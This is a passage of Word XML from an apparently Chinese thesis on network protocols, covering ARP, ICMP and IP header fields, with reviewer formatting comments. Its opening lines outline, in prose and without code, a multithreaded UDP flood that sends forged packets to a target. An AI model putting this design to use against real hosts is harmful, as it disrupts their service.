          <w:t>通过ARP协议获取指定主机的MAC地址，作为UDP报文的目的MAC；</w:t>
        </w:r>
        <w:r w:rsidRPr="007D3582">
          <w:rPr>
            <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          </w:rPr>
          <w:lastRenderedPageBreak/>
          <w:t>随机生成UDP报文的源MAC、源IP和源端口，构造UDP报文的以太网首部、IP首部和UDP报文；利用多线程技术，向指定主机发送大量伪造的UDP报文，对目标主机进行攻击。</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="2805DBC4" w14:textId="77777777" w:rsidR="00150B71" w:rsidRPr="00E90326" w:rsidRDefault="00150B71" w:rsidP="00D05338">
      <w:pPr>
        <w:pStyle w:val="10505"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="432" w:hanging="432"/>
        <w:jc w:val="both"/>
        <w:sectPr w:rsidR="00150B71" w:rsidRPr="00E90326" w:rsidSect="00ED015D">
          <w:headerReference w:type="default" r:id="rId25"/>
          <w:footerReference w:type="even" r:id="rId26"/>
          <w:footerReference w:type="default" r:id="rId27"/>
          <w:headerReference w:type="first" r:id="rId28"/>
          <w:footerReference w:type="first" r:id="rId29"/>
          <w:pgSz w:w="11906" w:h="16838"/>
          <w:pgMar w:top="1440" w:right="1800" w:bottom="1440" w:left="1800" w:header="1134" w:footer="992" w:gutter="0"/>
          <w:pgNumType w:start="1"/>
          <w:cols w:space="720"/>
          <w:docGrid w:linePitch="326"/>
        </w:sectPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3BC175D4" w14:textId="229B4EDE" w:rsidR="00D373B2" w:rsidRPr="00E90326" w:rsidRDefault="00D373B2" w:rsidP="00D05338">
      <w:pPr>
        <w:pStyle w:val="10505"/>
        <w:pageBreakBefore/>
        <w:spacing w:before="120" w:after="120" w:line="480" w:lineRule="auto"/>
        <w:ind w:left="431" w:hanging="431"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
          <w:b/>
          <w:szCs w:val="36"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="959" w:name="_Hlt273261552"/>
      <w:bookmarkStart w:id="960" w:name="_Hlt279679426"/>
      <w:bookmarkStart w:id="961" w:name="_Toc482141224"/>
      <w:bookmarkStart w:id="962" w:name="_Toc482141897"/>
      <w:bookmarkStart w:id="963" w:name="_Toc482522607"/>
      <w:bookmarkEnd w:id="959"/>
      <w:bookmarkEnd w:id="960"/>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bookmarkEnd w:id="961"/>
      <w:bookmarkEnd w:id="962"/>
      <w:bookmarkEnd w:id="963"/>
    </w:p>
    <w:p w14:paraId="541F3F27" w14:textId="11558D9F" w:rsidR="008B0625" w:rsidRPr="00E90326" w:rsidRDefault="00D373B2" w:rsidP="008B0625">
      <w:pPr>
        <w:pStyle w:val="20505"/>
        <w:spacing w:before="120" w:after="120" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="964" w:name="_Toc482141225"/>
      <w:bookmarkStart w:id="965" w:name="_Toc482141898"/>
      <w:bookmarkStart w:id="966" w:name="_Toc482522608"/>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bookmarkEnd w:id="964"/>
      <w:bookmarkEnd w:id="965"/>
      <w:bookmarkEnd w:id="966"/>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967" w:name="_Toc482141226"/>
      <w:bookmarkStart w:id="968" w:name="_Toc482141899"/>
      <w:bookmarkStart w:id="969" w:name="_Toc482522609"/>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bookmarkEnd w:id="967"/>
      <w:bookmarkEnd w:id="968"/>
      <w:bookmarkEnd w:id="969"/>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66C1D861"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A0F67">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia" w:cs="Arial" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>.</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27607A54" w:rsidR="00944538" w:rsidRPr="004262A7" w:rsidRDefault="00944538" w:rsidP="00A765AC">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="004262A7">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>表2</w:t>
      </w:r>
      <w:r w:rsidR="009A0F67" w:rsidRPr="004262A7">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidRPr="004262A7">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="004262A7">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidRPr="004262A7">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> </w:instrText>
      </w:r>
      <w:r w:rsidRPr="004262A7">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:instrText>SEQ 表2- \* ARABIC</w:instrText>
      </w:r>
      <w:r w:rsidRPr="004262A7">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> </w:instrText>
      </w:r>
      <w:r w:rsidRPr="004262A7">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00AD16B6" w:rsidRPr="004262A7">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r w:rsidRPr="004262A7">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r w:rsidRPr="004262A7">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>地址解析协议报文</w:t>
      </w:r>
      <w:ins w:id="970" w:author="renxt" w:date="2017-05-13T20:49:00Z">
        <w:r w:rsidR="00CF7924">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia" w:hint="eastAsia"/>
            <w:sz w:val="21"/>
            <w:szCs w:val="21"/>
          </w:rPr>
          <w:t>（不让有</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="971" w:author="renxt" w:date="2017-05-13T20:50:00Z">
        <w:r w:rsidR="00CF7924">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia" w:hint="eastAsia"/>
            <w:sz w:val="21"/>
            <w:szCs w:val="21"/>
          </w:rPr>
          <w:t>空行，就是去不掉，表格</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="972" w:author="renxt" w:date="2017-05-13T20:53:00Z">
        <w:r w:rsidR="003841BF">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia" w:hint="eastAsia"/>
            <w:sz w:val="21"/>
            <w:szCs w:val="21"/>
          </w:rPr>
          <w:t>框</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="973" w:author="renxt" w:date="2017-05-13T20:50:00Z">
        <w:r w:rsidR="00CF7924">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia" w:hint="eastAsia"/>
            <w:sz w:val="21"/>
            <w:szCs w:val="21"/>
          </w:rPr>
          <w:t>能打印出来吗？</w:t>
        </w:r>
        <w:r w:rsidR="00A407D4">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia" w:hint="eastAsia"/>
            <w:sz w:val="21"/>
            <w:szCs w:val="21"/>
          </w:rPr>
          <w:t>以下对</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="974" w:author="renxt" w:date="2017-05-13T20:51:00Z">
        <w:r w:rsidR="00A407D4">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia" w:hint="eastAsia"/>
            <w:sz w:val="21"/>
            <w:szCs w:val="21"/>
          </w:rPr>
          <w:t>吗？参考计算机网络重画</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="975" w:author="renxt" w:date="2017-05-13T20:53:00Z">
        <w:r w:rsidR="003841BF">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia" w:hint="eastAsia"/>
            <w:sz w:val="21"/>
            <w:szCs w:val="21"/>
          </w:rPr>
          <w:t>。这是图不是表）</w:t>
        </w:r>
      </w:ins>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949"/>
        <w:gridCol w:w="1411"/>
        <w:gridCol w:w="3240"/>
      </w:tblGrid>
      <w:tr w:rsidR="001B5590" w:rsidRPr="00E90326" w14:paraId="2B2F5C2C" w14:textId="77777777" w:rsidTr="00264649">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03318E">
            <w:pPr>
              <w:spacing w:before="120" w:after="120"/>
              <w:rPr>
                <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="333333"/>
                <w:sz w:val="21"/>
                <w:szCs w:val="21"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="001B5590" w:rsidRPr="00E90326" w14:paraId="7959DBA9"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03318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264649">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46E5F9CB"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r w:rsidR="001B5590" w:rsidRPr="00E90326" w14:paraId="12993DC7"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2105F81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32F9A9EF"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52506E5E" w14:textId="77777777" w:rsidTr="00264649">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1F5172AE"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01F6C802"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1字节）</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="001B5590" w:rsidRPr="00E90326" w14:paraId="08A3C325"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4F9AB730"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5字节）</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="001B5590" w:rsidRPr="00E90326" w14:paraId="536A2037" w14:textId="77777777" w:rsidTr="00264649">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2DEC5F96"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w:t>
            </w:r>
            <w:r w:rsidR="009A0F67">
              <w:rPr>
                <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia" w:cs="Arial"/>
                <w:color w:val="333333"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
            <w:r w:rsidRPr="00E90326">
              <w:rPr>
                <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia" w:cs="Arial"/>
                <w:color w:val="333333"/>
              </w:rPr>
              <w:t>3字节）</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="2962B114" w14:textId="77777777" w:rsidR="001B5590" w:rsidRPr="00E90326" w:rsidRDefault="001B5590" w:rsidP="001B5590">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>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976" w:name="_Toc482141227"/>
      <w:bookmarkStart w:id="977" w:name="_Toc482141900"/>
      <w:bookmarkStart w:id="978" w:name="_Toc482522610"/>
      <w:r w:rsidRPr="00E90326">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
          <w:b/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>ICMP</w:t>
      </w:r>
      <w:r w:rsidRPr="00E90326">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia" w:hint="eastAsia"/>
          <w:b/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>协议</w:t>
      </w:r>
      <w:bookmarkEnd w:id="976"/>
      <w:bookmarkEnd w:id="977"/>
      <w:bookmarkEnd w:id="978"/>
    </w:p>
    <w:p w14:paraId="46E2E347" w14:textId="5E2248B6"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w:t>
      </w:r>
      <w:r w:rsidR="009C72B6">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>境中的各种问题反馈，通过这些信息，令管理者可以对所发生的问题做出</w:t>
      </w:r>
      <w:r w:rsidRPr="00E90326">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>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5ADD6904" w:rsidR="00496360" w:rsidRPr="0016745C" w:rsidRDefault="00496360" w:rsidP="00A765AC">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0016745C">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>表2</w:t>
      </w:r>
      <w:r w:rsidR="009A0F67" w:rsidRPr="0016745C">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidRPr="0016745C">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="0016745C">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidRPr="0016745C">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> </w:instrText>
      </w:r>
      <w:r w:rsidRPr="0016745C">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:instrText>SEQ 表2- \* ARABIC</w:instrText>
      </w:r>
      <w:r w:rsidRPr="0016745C">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> </w:instrText>
      </w:r>
      <w:r w:rsidRPr="0016745C">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00AD16B6" w:rsidRPr="0016745C">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>2</w:t>
      </w:r>
      <w:r w:rsidRPr="0016745C">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r w:rsidRPr="0016745C">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> ICMP</w:t>
      </w:r>
      <w:r w:rsidRPr="0016745C">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>报头</w:t>
      </w:r>
      <w:ins w:id="979" w:author="renxt" w:date="2017-05-13T20:51:00Z">
        <w:r w:rsidR="00BF1680">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia" w:hint="eastAsia"/>
            <w:sz w:val="21"/>
            <w:szCs w:val="21"/>
          </w:rPr>
          <w:t>（表格能打印出来吗？以下对吗？参考计算机网络重画</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="980" w:author="renxt" w:date="2017-05-13T20:54:00Z">
        <w:r w:rsidR="003841BF">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia" w:hint="eastAsia"/>
            <w:sz w:val="21"/>
            <w:szCs w:val="21"/>
          </w:rPr>
          <w:t>。这是图不是表</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="981" w:author="renxt" w:date="2017-05-13T20:51:00Z">
        <w:r w:rsidR="00BF1680">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia" w:hint="eastAsia"/>
            <w:sz w:val="21"/>
            <w:szCs w:val="21"/>
          </w:rPr>
          <w:t>）</w:t>
        </w:r>
      </w:ins>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623C3FED"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4A1B5DEC"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6BD3039B"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01F01836"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w:t>
            </w:r>
            <w:r w:rsidR="009A0F67">
              <w:rPr>
                <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia" w:cs="Arial"/>
                <w:bCs/>
                <w:color w:val="000000"/>
                <w:kern w:val="0"/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
            <w:r w:rsidRPr="00E90326">
              <w:rPr>
                <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia" w:cs="Arial"/>
                <w:bCs/>
                <w:color w:val="000000"/>
                <w:kern w:val="0"/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>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7A847F58" w:rsidR="00B73F68" w:rsidRPr="00E90326" w:rsidRDefault="00831159" w:rsidP="00BE538C">
      <w:pPr>
        <w:spacing w:beforeLines="0" w:afterLines="0" w:line="360" w:lineRule="exact"/>
        <w:ind w:firstLine="420"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>Code</w:t>
      </w:r>
      <w:r w:rsidR="00B73F68" w:rsidRPr="00E90326">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>进一步划分ICMP的类型,该字段用来查找产生错误的原因.；例如，ICMP的目标不可达</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>的</w:t>
      </w:r>
      <w:r w:rsidR="00B73F68" w:rsidRPr="00E90326">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>类型可以把这个位设为1至15等来表示不同的意思。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B365D4A" w14:textId="2ADC104B" w:rsidR="00B73F68" w:rsidRPr="00E90326" w:rsidRDefault="00831159" w:rsidP="00B73F68">
      <w:pPr>
        <w:spacing w:beforeLines="0" w:afterLines="0" w:line="360" w:lineRule="exact"/>
        <w:ind w:firstLineChars="200" w:firstLine="480"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>Checksum</w:t>
      </w:r>
      <w:r w:rsidR="00B73F68" w:rsidRPr="00E90326">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>校验码</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>的</w:t>
      </w:r>
      <w:r w:rsidR="00B73F68" w:rsidRPr="00E90326">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>部分,这个字段包含有从ICMP报头和数据部分计算得来的，用于检查错误的数据，其中此校验码字段的值视为0。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FA586D9" w14:textId="65837645" w:rsidR="00B73F68" w:rsidRPr="00E90326" w:rsidRDefault="00831159" w:rsidP="00B73F68">
      <w:pPr>
        <w:spacing w:beforeLines="0" w:afterLines="0" w:line="360" w:lineRule="exact"/>
        <w:ind w:firstLineChars="200" w:firstLine="480"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>ID</w:t>
      </w:r>
      <w:r w:rsidR="00B73F68" w:rsidRPr="00E90326">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>这个字段包含了ID值，在Echo Reply类型的消息中要返回这个字段。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7527B07C" w14:textId="26B9C8FC" w:rsidR="001B5590" w:rsidRPr="00E90326" w:rsidRDefault="00B73F68" w:rsidP="00220BF2">
      <w:pPr>
        <w:spacing w:beforeLines="0" w:before="120" w:afterLines="0" w:after="120" w:line="360" w:lineRule="exact"/>
        <w:ind w:firstLineChars="200" w:firstLine="480"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E90326">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>Sequence这个字段包含一个序号，同样要在Echo Reply类型的消息中要返回这个字段。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13EACED1" w14:textId="59539711"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982" w:name="_Toc482141228"/>
      <w:bookmarkStart w:id="983" w:name="_Toc482141901"/>
      <w:bookmarkStart w:id="984" w:name="_Toc482522611"/>
      <w:r w:rsidRPr="00E90326">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
          <w:b/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>IP</w:t>
      </w:r>
      <w:r w:rsidRPr="00E90326">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia" w:hint="eastAsia"/>
          <w:b/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>协议</w:t>
      </w:r>
      <w:bookmarkEnd w:id="982"/>
      <w:bookmarkEnd w:id="983"/>
      <w:bookmarkEnd w:id="984"/>
    </w:p>
    <w:p w14:paraId="496A220A" w14:textId="218BB87E" w:rsidR="008B0625" w:rsidRDefault="008B0625" w:rsidP="003C22FC">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9A0F67">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidRPr="00E90326">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>3所示：。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="083178A4" w14:textId="77777777" w:rsidR="003C22FC" w:rsidRPr="00E90326" w:rsidRDefault="003C22FC" w:rsidP="003C22FC">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="360" w:lineRule="exact"/>
        <w:ind w:firstLineChars="200" w:firstLine="480"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="201F3158" w14:textId="5F8D096C" w:rsidR="00AD16B6" w:rsidRDefault="00AD16B6" w:rsidP="00BF276F">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>表</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>2</w:t>
      </w:r>
      <w:r w:rsidR="009A0F67">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>.</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IP数据包头部格式</w:t>
      </w:r>
      <w:ins w:id="985" w:author="renxt" w:date="2017-05-13T20:54:00Z">
        <w:r w:rsidR="003841BF">
          <w:rPr>
            <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          </w:rPr>
          <w:t>（居中。</w:t>
        </w:r>
        <w:r w:rsidR="003841BF">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia" w:hint="eastAsia"/>
            <w:sz w:val="21"/>
            <w:szCs w:val="21"/>
          </w:rPr>
          <w:t>这是图不是表</w:t>
        </w:r>
        <w:r w:rsidR="003841BF">
          <w:rPr>
            <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          </w:rPr>
          <w:t>）</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:tbl>
      <w:tblPr>
